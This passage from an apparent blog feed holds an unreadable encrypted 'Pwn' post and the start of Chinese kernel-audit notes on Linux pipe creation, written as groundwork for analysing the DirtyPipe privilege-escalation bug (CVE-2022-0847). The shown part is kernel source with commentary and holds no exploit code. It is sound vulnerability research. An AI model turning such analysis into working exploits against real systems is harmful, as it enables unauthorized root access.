82b2c8181f115e745a89a9d064f348188cd8bad86cf2dd0097ffdcec7afee9f67cd518a13bf19743353854c799765a6135abb69bad13095818e4d863e9c6574d8391e42acad9411d43954ac758357768b2db1582e07132c64c48f21e1f0e6b3a0143ce9609d7b18df592ff9fc6b740981884f40f82b33ffc04e11ea567c79a5306a59228e00913b9455ce3c5bda4fbffa9a6ff1107275e992ee63fcea85a3692a3e4c48eebc7698e91fbd5e263f879ff8b6573fef513efd9ef884335e7dda2ed97d1bb9b4f7f0464132262961fc1957fc52c7655b6ffe808a5dbab94f6c613db12e29877e7385680a505306711caaa38765f0531277842a8917756fdfff6b7150af73450cb190f813150b075020ff595e925e46e155ba15afe72cd4849b47f369c642929d91367eb72215a48c272d024d3ddc8ea1a7dde2106837252f1b970ba4bbb527ff093767b9f5f5e7ba31a744450a64755689020bbf0065e6e2b3abcd573552d3cfe08d1a4cfe6b1afb7c58bb08be9a661cb9856c3a5322ed6e22f9253fa7415b551a9b65a2e3eb53e73b1562dca853372e2a3a47371af7f3185ab06d7a92fbbd0e1ebaa524eed51fc315f35a6a43757bba74e1df4115be63c0ad66952c66cc359a3bf004d75e2c645bd77b634236bf3219581747b93739e73b6053270b5d77b721a9333c65646b399c231709264c8c97642e5c3824698ddf5fc6fa28448e794df5bfa7f42f688e9716aeabfdebabcc13b9fc44430bb59f11d956f622522c9f8e025eff3966f693f08d5eb8770d66d1aeaf046c4488051879f8ec5c3ee22598a022a0bffd790a77c690814b0b5015d97db1cbf65f0adb9dc55fec88d4fc6a0351665d93a909c9683b032c5ef74b6686dcc83b0b41f864c60928bbb810438d8623ec87c8e1bb0d62b4b1c88d67ae3f4abd04a371b45399248692c31dd01065e8b54630b132b0ba035474e94b06de74f6e4f5cdcd5a6dcc4426b45c5f64a9877dbc49b016f828a684d1ffb0fae23b8f09628147c6f7e61ac0375598ced20a9a09ec3e062cb551e6079091fa31cc0e45347895fd3c6db222048adb611c4f48df8f7bbe3bec749930b552cc207e05c34f5bbc3e78887e8beb3382eb6e43ec474b287b7e8799d3d4c3ec56e52e25129b37385c241af85ec9d46173ce1a406f29bb85220882694a15b1d20895cadf1ff48769c8cb06390564aa92555c09735bc1ff8e9ba76b9a552d56398d0956d18bbb19282e89654b6cdcbc2df52f9cb8a511da5d6602fc67fa82fec52060aa28410e547146a299c9aff02dba0187652a72d963d3b18b520e3ab612b8142e7236659056c4124973130e988ae257ddb079464608115f48246b441984e7cd72dc628b578cb9d669ea774ae5d9d7cdf0b7ab5cd3db515762e0b4fe097d5c0f54a88554960e305bcaa25b678b9164d53af154a924cbeee61f8f1e16b00b72780d0b183a587ce6602a41ea5219e704e8b5364731668b3057c3991dc25bebb737aac5492d5458c7171c1210f25ee0bb2171d4f1927dfe182d718dbfbd46cc5cb6a79fd6b034d52a142e1a1f0e5f2cae11b074d851205435d6d0f3b3540e0953f51c1432314c47672a052a1d4824f1513d43e7655cf55faa9834c17e304063e7140c29277ed00f139801292447ad2fd78601564e841c822a0cf1f099c0f822043be2f873652a03b01a1af072a399e4051bc8d175242a5f4f90d474f6f2ceba804679b52688d6648e19003c7ff059b44d557cba6fd1de16fe043d698af1472a68c87300e8146504a9110ce79372f1c0018ec6adbb08bc52aca460122017b0c48aa29124ae1011db0e23d5819bef51247bd69c97ce62e8bb5237c985aac1ff1d95f8b486e796cd47491431cba54b0c1e4d907a075ace539e359c0695b815c0dcc1577e21a4e6b14c8276d66d6a38ce477a16b1bebf393c8ed0a3b819d493693f28a128b112b8e1237604476b171901630822015c6ad8030813a543d4c0bcd226c6fe6eb695f094779509d5536bb36b9fe6b73e35e87a8648f630c5da64ed48373738ee00f010a040505795ace62863ae07785d65a30a88e095c87fef9b8bedb310cd19484b2ea8f214961c8f8c7a4ee646bf044f9a2729b9de8edb84e3042d621734524ac436899bc24a726875eaa3fc896c9aaa462d340801e492a54d610019e24ad7d36c0eba66cdae80105c52af063f35309df44c01ef80bc9a53726697a4e4ada65f9070baf881816e3d4994215f882e471eb5521f5d1650f5549416a2d3c3a55485709625017a2b682bb90b4682362eb683c935cc31c1d38ae92a4b416dbd0c7c887a190b78419c9fc1dd8f29c0c57ece7fa43a439507285351c57b140370b46e1dcbc0c8680382c5448413409ff223b95b0bdb0c7a1815a6ee54e33d34672533e62832a4c4889c3b488e3ca905f0517dbe67ac071b52dbacef9717451442ecce650897dd46bf27b363be0235635c01cff90d6eee5fba5ada1bf72cd9e1ec50da843f9cf82d74bfa03a2360a0e60ce09edddce131da8e423a1939b5c1266ada987631a735650c3da6ffac03367e8977517b13d92728e26fbb16f65f912dd122ed276a82efee06d31bebdf12e6e339300384719a2c474739a74c8e595bb7ea1e95163c3914b70440a130a71bc132652622bfeb96a5b9a68869507f3fd03897cd70999dcde1ea95f2a472b3bacc1546cb00338017e3109bb4873b131d290c04447b684ae2ac4be9888cbdeef17be1ea03b4c64d74489dfb6bc55efa25fc6d5b242d37a2b8e09a7fc3c4cc68072b02efe5b2f1d3ccd233bb0d3ec2aca0aceac635434b452e896de4a207ba1f10f96e5d9c3247bb3b80af2c12f44493c02a6dc43ccfa250229f0a953b298891404a6672682d2385226db3e92011724a56d2dfe049b89a02cd33c1d62e71d17f9f273af97300dcf05338925924363c0d23d2a78bafa0fc599863a91710e584dc8e51f4cdc5e78a8c07153c82c8f9479e491b0648890ffb49a23e7ed3ac4184a1bb6e978b1979666f005c48eb1ea6f3fc02cdf9b563db31e705bcf563ae55f3192d74cfa1acb1acf224b2a3c8d36d139e8a4b67210a1133dc5f3f8ec4ed77425a44df9f2cb11b532dea238b6a1d54701ffe350362a7459bd7e491d4a86cefb538f289cfffde147abe627e31342dd0f2ecad8aa705875ca45323dffb79d94be63cac88d5d4b685911eb553bcb61871f51dceb3bcb697f1bfa14b229a1540b4a28c79459332c74835e9ac1b554251508dccabb1fc6591879c6029aee4a1f8638e49792269edd1654e1df9902e645446f69b9450576a051447b973ed9ed2b304f00e906ebade5dac774378c4214ed09a7f3d9ce0ea59732d40c79225dfffb77fe9b71d97698394e7aaf691faa43f7f9720d16a910a5d725f3dfa890872d8f8b4a7e66720c920bb503cc91f86703f15fbff9c924c9e90a497630fe2da6d8929aa26dca933ff8b2372e28844c585617a9e1813b0a07971677ca8b075a84bbbd763ac29e924116d1e4bf54e29ffaa25ba9474ebfb54040daa954bf831cf049d4462859197a81a532281e4264d294d957ec1b098f9b10d1b0e5c645a711aa9868a019f9925daeda4f6a4eeec62a3fda93da968ee96ac47063a7986db677eba6daf896e498fa8bc48b4dcdb7c016b67678934a9ca98dd7377d4cba7f5adcd996ec13e9445c0aff0c85c818566d7a6ff04dec28036cdda20dae489717be22338dd6b9fc4b87287ea73dfa4d15efac88e7ff37f200129fedf99d1da07ab065c38a536cd56990ed92ee47b4322e560734b4a7aa039dabef41cbb8c811cdbc0037395a31a43b61fbb362b0d77726e4dda61ef47b629411466ee992f0293ce14a12dbc83a88f18a1d50e9b35b120244ae089858574689ea9c3845d17912369b33a08f35a860416b095eff5c9fb2ac9f7c83e7d27c2b39baab818d23ec12580900b888d45e755036c5970819c5a49f6e005d93ce353f629de5fa0f2392668c4f675feecddba472621be38d81dd936d24434f60bbe8d48d45fd967e1b887a714de3442fb859894981a5f52b2760ffaeb6301321be34c30c0484911605e5be57ef37d6d83680e7ede1ec1d3e0b4677c500e0fa62e6fdc76bc30b749b8273dc2e10ece7b5dd5bccb4bd5a7b0e31e8f66f7a386e049bb60223702de6458c4b5f1ffc6d30a9ebce9d7e11fc883ead78c1422a3bd72d10d26883ccb94b2038521ab757087a03c3f0916e212d7fc2664846271e61beec96afce4788b138302f9e7a32659c488c20292dfb7ab9adedd113fe5469ddc0f9a8e8199692e368357f50cf1e426785003c03b7384d365fde5ae8004f84e608d22b1cb09b2a870d220cebd56dab41819f2130b5adaea12ab65120f573d479d0b7d6b0ab9204baf15c75853779b597a6827347e729e8c6abd8b41e49fa05e544c9bde858069278ad4959cf4362835a9fb1bb6144cc0a54a29055abad3b1f419c6a3a9a277c8fdfbf2a16a7a19d8fadc87b1949bf2afe4bb0ddda71574e73696255c7cedae66daa301d52d37c000fc9d9ed4805b9252d0a26f17ada124d0747dcbe1fc7b14222c116d4a985061ebd1cf782f11f8ad1aa887541c046f52dd78067ee3531103eba68a83d711ad913ca0a64a159719f43920a043d0ed527e57dbc8bf9a20d79dfc98f35d5f90572fdb4a5693a85defbfdc506cf4cf629ba0b26fe6d914adda5210f68454e3da5c92664171738ab0e566c4b6e4bf0748bbc26daf6d306a87e6e80853ce1fdd397ae6029258c5c00f99396aa15895d8410d0ae49057a89e5b8958f9e8e8baef1962d800f3f93e10dd0661990b00c39fa0d796e6c8fff8eb6952ddd942f5992bd75bdd456265d1aee732dcaef283fc9bfb8808d0ae963395feccc7ffd062a760f0b78e7ffc68d1f4db45852c6e38dfd17d9326bdb4943faf4ef5b6a86348df439af7334ca634a4357edfb5b639a70cf1d9cc673564f83916c6a69352d6d530036ac0615de4baf3bb6fb24c1ba8e5070328662ea7953b93f81f908a586d18b7ba862c370b72ce0ed7fd1af649434e0fe04fbdddb1e0704da6fad7e98cb38dc68c94120698634c9a0cde9098e2699e2b02a593e25c80b633026dbfaeceba717dcb6455f30c0ebf99ac4d355cd03037820aa0e845089850370c1ae4d9e3b3131cfa519ab08de1e84cf6a5c7b7e4b6ead3fa57fd5b953bc88bec0d7cf6cc4d8d61b4d8cac173fea9b17ebe9f3e2a5b4f184f53c103e09c5c22d3b1cdc6f1bcaac705a248e441356ed9a22846ec87da8d8191fd0f50bef5ba9108040a739be1fd52647c83707c8a0404f8817999af09587150bd67c43d2e4ab4845ef44f8ba423c7959a33a89bc9f37bed54ae81aee32a086a178f15acd09faa580ad5f3f631ee8e38250b7340fe07407ff8a2ce10804f83d8d106402ac62d714b643e1beeb240e783a08e1ab7d52008b06cc1659f46d37121d9f164d68d59b07d36977b36eab55ec627fee2e0b444ce325198d7f0c8f1cf7e8daf34fcbf316e7631d352f7f08f6649e406870d6d957baa6f94f732c1695b0fe5795e60d68d9ba85935027a61b97e0d86f6b57dbf111b0a1322c9e5137453e622e81c2d6a382f29e76cc9cdd38932fece19792f595b86917f4fd33d952f26a32cc35b719462562d66272b8f3d1ffb88bedd966a4fa3430044fdec2f0ea52f680431afca144543b04869d66b910d518e77906f0a2ad4fdab073ca447307cae149551a3e61fe847acefc0512e45b96071e7b1d360aad3810cf52cd5a6cd59d7f2d09eef1b8091ebec15cd3d7f88690a7130ecc2e430c871af65fb53693fd589167dab069b443072939c2153b2055d52994fbb8fa817285cd6bc5d6ad31858b72ecb38dfd5d8bb25b08fda655c1706f804e3be3494ea69de679d0713130aab37f0a662afbba53c1445c7b50f654602a90506c95ef5d4bbfc4f4616f706bb756bf4fcc7d4689c5885b622460ff70eada197e1d01f03fdb84ffe12f4ef516db21a9d57574754f15ef8320eb6a779da6da9f77cc36c1d171f18c2f2174d37e1d6710fe89fc5662dba47a36b92aa63c8352631dde7a6b6421f9c3f0bc6e2b8d65fa6adb3f6eaf6182b17eb271888bfc6072b3ec6e39707b5f84b86a8c7ec33b2de9ea06787f8c7c348a608b20a41f7de35c6a9cf269e361b371924d1f38e943ddc91294f8b69a66933d7a8b3b4187b8d97437db7ed5b0fc7105029a1ca59ff37e55736cc0c96265f3af93538cf6212ea4232b0d4f5746c79743ac59a45bcc938f9e8c9fb5126c48748dea6bdaa4ca43597f1cb998ca555c950285c64cbe7ca4d18e69fd62d31cbbacaf2ff6e7401d17ec41fc2e7101dde65e751cc5576aeeed7d98ee4f10a52f6e67360032002792cf45800030396d143c04b66d525645b4644f613a24e91c9f344e266d8263615849af793652b41e5006ce118b2fa0bdd6810fe90567f8af22795a86b5a2d9c88f77afe170f87efb957c9073a2c8117a0cb368243ba60d45fc755b594c3b236af3ebd2047e9163742c19e83ce06f386cdd28fae80fd8ede36500c9de6f52c73af827fbd166869c204d9b943c157aa323450e21ed2777959a378c99207bf5ee82235347a56bc03be51cc9997a0ef8a0e87fa60d4cb29b270625b2c5faef80e21f0ec67d87f9118d22c2851e7153e420387690e2b507432e03826d7fe0ebfdcdca9429f16115fae24f1cec11deb27c046ddff05c69acf274610e0320eff4f61451fe93d7dc771fb946485a52ab93d20812f2f47356c7354f2a2d12cb5943016b9cd215bb1826a967b143cd36fa37af1068092688109757fb352b97f314e2e407bdcf6ea3251b670f9b19ea7fde31336b23847f485d4e54c3195edcdf6ee54cebfb6094d574fd5177a1451c1d85834d9816d2253f9cd9b3834164b44a086aa1235da36783c185d4125a663d08b904c7a928df791733e9c71b58b589628d29387b92e2bf4c42f494e7a51da8b6046997df73a3cbec566afcd005bd8dee0778615ae2d756440f364bf88d047160ef68fd2d4e3f9a0a5033c28a65d3d81e3e68ebcff165af3594ce3a354612ed9b7d13e490efcd55f90aae788120526601f42371a940aed67f01298569696db4f1885ec6e9d368ea90970ec21d6f385287eee2249a8f721298f5f0cc41c64a1ad313a7540f7018c5cc3dcb829bc22bcbc2a1286f6c0bd8aac4f061ded43d039c1e876addbb528af79aa780a868633148a71c978ad03fd104f9962ffd1ae6c587c4a65cebf4d27de9f240ed91b73a7afe25a7ddb56aedce4cdd14500b163eefb0cce2c8ecb092ce6e5ece36adfc8bcb1454c536d197abd5bd58eae055c1d33f99633c5a303d8de66da2151aecfdf8d661042b35702f4f72e6b318ad6d11f32580ddef850ed9da6606a3d089a52f67ba06faae0bf7ad205c9aa6157b0593d0c67d4bcf578d1b6d30efb27603b9b621f1c3f3eb1d749e3653b4aac9d47d5387eb951e001fe2a8b532d0efd7bf8f7899c457a2231fc7da511fc0dd42d238769c7286ebe6e728f19348ab549dfd2b5540ffa315cea479ea81d88ec78353d55e5906ddf4ef997c3d6393bfb6f6ee8ad82f161e3cdd628bc0efe40e8874e80c4bf5853313c286d3727af1da0052a53edaee7fe6d23481bfc2a98b24cf0a81b079174a5a252fe7e4087826ca87fe48dfa3c08e71d8956f5ded055f8b773306eb613f9eb080e16623137a66283a5f56257b9066a0e18e7fea118ebaf6d82a9d7a41e23d5c443570aedc50a56a850c4a3e1aa6ab39afc1ef0d3b336289fc7c0f1465340be1789799110d8b999615800a034d0698da2e1d9def9208ac190010c09d321490979e8806358bc53b4053163de6356603dbd8bdd76374d11c8c949656b5ed6145ddc4a3931a72475a149273059a1043413d298abd8307047ecc1f574729050ce2bda7efd8f95a22f1ec7d06645e529e49b016fe9545430d23f6f91c3a3533aade7adf79c1785943977bff00f77e99a55a776506ffe72f0d24115ec9495836bd5f744e228fd8340a8f1a7a21dcec1f89aaae8d884d66a07fa906de503d05be0db7ca7e4b166ee1b102736735a8139c545e5a88b43225e34a6934634676850897a050d1fd39c30e7bb812a77957d9867222c13bf4ebeb591eea49d0b1fbb3450ed6347fa80e3fb791296489639339da114754b5ec949536586356fa79943285a69486aa69658c17ad9229edaee60e24d094961e708f71a56f79dbc81a33c3280ad6cf696bb4170a83272e8a0c03b73beebdcc6f3e369d9f478c54ab5b29741534d5bb9f148f57431a8aaf7baa18566e4544ecef5618e5af69fa2057043f9d4f9378ec2ca9b85f7c57ed76fd07da47d1deacd652ce3e4b745d7807973c84ab887aabee891314f8a9457666d1fa3a7f0272e59128a90046696735adb0f11ea9ba2067be27bed3610442c010a2ca9f8b8b59006c39f123575287808d30fa0fefdb4fb9dfc1c7b16f73e66de38544a0e63b85fefe22c194e808575ddc6a3273a1e24edf32a9fb8218c3197f88085d3aeea209a5b3028dcb09c0441a1789eb00a69dbe878cdbca2408f577bbbc4a9fcf90439277f9ab7953552016629706311bc6f033981f61aff630d66f23408a874e407f5ba33cd85f68c629fc97b5d4118274f86c255f251bc3f75b58b322d78f4c1712c23655fc367920797c6786ba3acbe24d670ec7470f2541b5a3f7d8f39574f6eff7cd82e5e0b4a9211fa0ff185c912a8f888d0d7c9e80b20879957386d136b76d17f2f46426ee536d9198d4e4d09aaaf706fd459d1efc7511d04eb058ea21238e7bd0808f76af72f02808cc2f920c73a18e16806998b9b819346a2d8264443f6419607268a3e178240a2fb85ed0822f054e306348fb3a939adbc69baec006e8d301a7db33a52e36f9edd4f3ca481ded76a9a49c810c4d79485634594c32a4cf65d2c4bf00a58c5708bad48dd20165b98213a07f64af8f36128790d92e4552b2a23691ae27350b6d131fd5ea54fd58b8a86ef64895e70044c2e8b1362edcf4438ecafa25c3e859ff84a70298f0d911460ce5b5137273234d8a5d6afc4d866f23a4cf9b31227cf9b2844c0d323050f227c3cde1c444d7933a96d34be5d94fd041b87e8a2d729010d1e3186a7a25bea314ef53a032a043d585b353fc2671624ab57a615182872791a1658cc49636953676f0058f9613b869476f57c3f26776d75466eaf9e86ba2f058d739fd6d28d91851127b74253ad88c65e21ee0148b9f16db799a76363ba0d9e3df61db2161d9263e7f29c96e346ef93d4a9be5ece238699066b43227e8df1195664a6a3268397adb8b01f87479c7aa9a50b3bd7711c1e20f76e9b0b31d91d843158de329ed7ad3c54a2de0e3bec1dbe9ac7d36b628679e6ab233e724636cdecfb3d1e3887433fd78cd4597e9e0c8889818e6c248954524bc12cc66be293a7feb97bc129a5850f9803c88f57b336d476e636bc3bd3f7b4300e6e3086c5bdca2975324bed983b87c1a22a474d014fe94774e705c726035ace56c8d062404c4c722d4d30913245585d64aebb7299b2f26fe6875e83d2c1f8e84fcfe7588e9e298f58566683ac614f5c817</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内核审计笔记 pipe.c, splice.c &amp;&amp; CVE-2022-0847 DirtyPipe分析</title>
      <link href="/2024/CVE-2022-0847%20DirtyPipe/"/>
      <url>/2024/CVE-2022-0847%20DirtyPipe/</url>
      
        <content type="html"><![CDATA[<p>只是阅读源码时的笔记..顺道复现了拖了很久的DirtyPipe.</p><span id="more"></span><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> {</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h2 id="pipe的创建-pipe-pipe2"><a href="#pipe的创建-pipe-pipe2" class="headerlink" title="pipe的创建(pipe,pipe2)"></a>pipe的创建(pipe,pipe2)</h2><p>pipe和pipe2的系统调用都转到do_pipe2处理.调用__do_pipe_flags完成pipe的创建,然后将文件描述符拷贝到用户,如果成功则调用fd_install使文件描述符生效.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">///home/znl/SkyAsk/Binarysafe/Kernel/linux-5.11.1/fs/pipe.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sys_pipe() is the normal C calling standard for creating</span></span><br><span class="line"><span class="comment"> * a pipe. It's not the way Unix traditionally does this, though.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_pipe2</span><span class="params">(<span class="type">int</span> __user *fildes, <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">files</span>[2];</span></span><br><span class="line"><span class="type">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">error = __do_pipe_flags(fd, files, flags);</span><br><span class="line"><span class="keyword">if</span> (!error) {</span><br><span class="line"><span class="keyword">if</span> (unlikely(copy_to_user(fildes, fd, <span class="keyword">sizeof</span>(fd)))) {</span><br><span class="line">fput(files[<span class="number">0</span>]);</span><br><span class="line">fput(files[<span class="number">1</span>]);</span><br><span class="line">put_unused_fd(fd[<span class="number">0</span>]);</span><br><span class="line">put_unused_fd(fd[<span class="number">1</span>]);</span><br><span class="line">error = -EFAULT;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">fd_install(fd[<span class="number">0</span>], files[<span class="number">0</span>]);</span><br><span class="line">fd_install(fd[<span class="number">1</span>], files[<span class="number">1</span>]);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE2(pipe2, <span class="type">int</span> __user *, fildes, <span class="type">int</span>, flags)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="type">int</span> __user *, fildes)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>fd_install 将当前任务的文件描述符表中fd的对应表项与该文件关联.<br>先从该任务的task_struct中获取打开文件表,再从打开文件表中获取到文件描述符表.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install a file pointer in the fd array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The VFS is full of places where we drop the files lock between</span></span><br><span class="line"><span class="comment"> * setting the open_fds bitmap and installing the file in the file</span></span><br><span class="line"><span class="comment"> * array.  At any such point, we are vulnerable to a dup2() race</span></span><br><span class="line"><span class="comment"> * installing a file in the array before us.  We need to detect this and</span></span><br><span class="line"><span class="comment"> * fput() the struct file we are about to overwrite in this case.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * It should never happen - if we allow dup2() do it, _really_ bad things</span></span><br><span class="line"><span class="comment"> * will follow.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This consumes the "file" refcount, so callers should treat it</span></span><br><span class="line"><span class="comment"> * as if they had called fput(file).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fd_install</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line"></span><br><span class="line">rcu_read_lock_sched();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(files-&gt;resize_in_progress)) {</span><br><span class="line">rcu_read_unlock_sched();</span><br><span class="line">spin_lock(&amp;files-&gt;file_lock);</span><br><span class="line">fdt = files_fdtable(files);</span><br><span class="line">BUG_ON(fdt-&gt;fd[fd] != <span class="literal">NULL</span>);</span><br><span class="line">rcu_assign_pointer(fdt-&gt;fd[fd], file);</span><br><span class="line">spin_unlock(&amp;files-&gt;file_lock);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* coupled with smp_wmb() in expand_fdtable() */</span></span><br><span class="line">smp_rmb();</span><br><span class="line">fdt = rcu_dereference_sched(files-&gt;fdt);</span><br><span class="line">BUG_ON(fdt-&gt;fd[fd] != <span class="literal">NULL</span>);</span><br><span class="line">rcu_assign_pointer(fdt-&gt;fd[fd], file);</span><br><span class="line">rcu_read_unlock_sched();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(fd_install);</span><br></pre></td></tr></tbody></table></figure><p>__do_pipe_flags函数: </p><ul><li>检查flags合法性</li><li>create_pipe_files创建pipe文件</li><li>获取两个未用的文件描述符.<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __do_pipe_flags(<span class="type">int</span> *fd, <span class="keyword">struct</span> file **files, <span class="type">int</span> flags)</span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"><span class="type">int</span> fdw, fdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT | O_NOTIFICATION_PIPE))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">error = create_pipe_files(files, flags);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">error = get_unused_fd_flags(flags);</span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_read_pipe;</span><br><span class="line">fdr = error;</span><br><span class="line"></span><br><span class="line">error = get_unused_fd_flags(flags);</span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_fdr;</span><br><span class="line">fdw = error;</span><br><span class="line"></span><br><span class="line">audit_fd_pair(fdr, fdw);</span><br><span class="line">fd[<span class="number">0</span>] = fdr;</span><br><span class="line">fd[<span class="number">1</span>] = fdw;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err_fdr:</span><br><span class="line">put_unused_fd(fdr);</span><br><span class="line"> err_read_pipe:</span><br><span class="line">fput(files[<span class="number">0</span>]);</span><br><span class="line">fput(files[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><p>create_pipe_files函数</p><ul><li>get_pipe_inode分配inode及pipe本体(pipe_inode_info结构),完成初始化并将二者关联.</li><li>alloc_file_pseudo分配一个虚拟文件并与管道的inode关联.</li><li>克隆该虚拟文件作为管道的另一端</li><li>stream_open将文件设置为流文件(not seekable and don’t have notion of position)<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 